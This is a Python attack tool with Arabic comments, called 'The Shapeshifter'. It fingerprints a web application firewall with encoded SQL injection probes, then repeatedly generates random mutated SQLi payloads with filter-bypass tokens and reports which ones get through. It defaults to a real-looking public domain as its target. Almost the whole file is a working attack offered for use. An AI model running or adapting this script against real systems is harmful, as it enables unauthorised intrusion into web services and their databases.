#!/usr/bin/env python3
"""
🧠 The Shapeshifter v1 - الذكاء المتغير
يتعلم من كل فشل، يتحور، ويخلق هجمات جديدة
"""
import requests, sys, json, os, re, random, string, time
from datetime import datetime
from urllib.parse import urlparse
from collections import defaultdict

class Shapeshifter:
    def __init__(self, target):
        self.target = target
        self.domain = urlparse(target).netloc
        self.brain = defaultdict(list)  # ذاكرة التعلم
        self.mutations = []  # الطفرات الناجحة
        self.session = requests.Session()
        self.generation = 1
    
    def log(self, msg): print(f"[🧠] {msg}")
    
    def analyze_defense(self):
        """تحليل سلوك الجدار الناري"""
        self.log("🔬 تحليل الجدار...")
        
        tests = [
            ("normal", "test"),
            ("suspicious", "' OR '1'='1"),
            ("encoded", "%27%20OR%20%271%27%3D%271"),
            ("double_encoded", "%2527%2520OR%2520%25271%2527%253D%25271"),
            ("unicode", "\\u0027 OR \\u00271\\u0027=\\u00271"),
        ]
        
        for name, payload in tests:
            try:
                r = self.session.get(f"{self.target}/api/stores?q={payload}", timeout=5)
                self.brain[name] = {
                    "status": r.status_code,
                    "length": len(r.text),
                    "blocked": r.status_code == 403
                }
                status = "🚫 Blocked" if r.status_code == 403 else "✅ Passed"
                self.log(f"   {name}: {status} ({r.status_code}, {len(r.text)} bytes)")
            except:
                pass
    
    def generate_payload(self, base_type="sqli"):
        """توليد Payload جديد بناءً على التعلم"""
        self.log(f"🧬 توليد جيل {self.generation}...")
        
        # قاعدة المعرفة
        atoms = {
            "sqli": ["'", "\"", "`", " OR ", " AND ", " UNION ", " SELECT ", " FROM ", " WHERE "],
            "bypass": ["/**/", "%09", "%0a", "%0d", "%0b", "%0c", "%00", "/*!*/"],
            "encoding": ["url", "double_url", "unicode", "hex", "base64"],
        }
        
        # توليد طفرة عشوائية ذكية
        if base_type == "sqli":
            parts = random.sample(atoms["sqli"], 3)
            bypass = random.choice(atoms["bypass"])
            payload = bypass.join(parts)
            
            # ترميز عشوائي
            if random.random() > 0.5:
                payload = ''.join(f"%{ord(c):02x}" if random.random() > 0.7 else c for c in payload)
        
        self.generation += 1
        return payload
    
    def attack_with_learning(self, rounds=5):
        """هجوم متواصل مع التعلم"""
        self.log("⚔️ بدء الهجوم المتواصل...")
        
        for i in range(rounds):
            # تحليل الجدار أولاً
            self.analyze_defense()
            
            # توليد 3 طفرات جديدة
            for j in range(3):
                payload = self.generate_payload()
                
                try:
                    r = self.session.get(f"{self.target}/api/stores?q={payload}", timeout=5)
                    
                    # التعلم من النتيجة
                    if r.status_code == 200 and len(r.text) > 100:
                        self.mutations.append(payload)
                        self.log(f"   🚨 طفرة ناجحة! {payload[:50]}")
                        return payload
                    else:
                        self.log(f"   ❌ فشل: {payload[:40]}...")
                except:
                    pass
            
            time.sleep(1)  # تأخير بين الأجيال
        
        return None
    
    def run(self):
        self.log(f"🧠 Shapeshifter: {self.target}")
        self.log("═" * 60)
        
        self.analyze_defense()
        result = self.attack_with_learning(5)
        
        if result:
            self.log(f"\n💣 اختراق! Payload: {result}")
        else:
            self.log(f"\n❌ الجدار صامد بعد 5 أجيال")
        
        # حفظ التعلم
        os.makedirs("logs/shapeshifter", exist_ok=True)
        fname = f"logs/shapeshifter/brain_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(fname, 'w') as f:
            json.dump({"brain": dict(self.brain), "mutations": self.mutations}, f, indent=2)
        self.log(f"📁 {fname}")

if __name__ == "__main__":
    target = sys.argv[1] if len(sys.argv) > 1 else "https://qrlist.app"
    Shapeshifter(target).run()
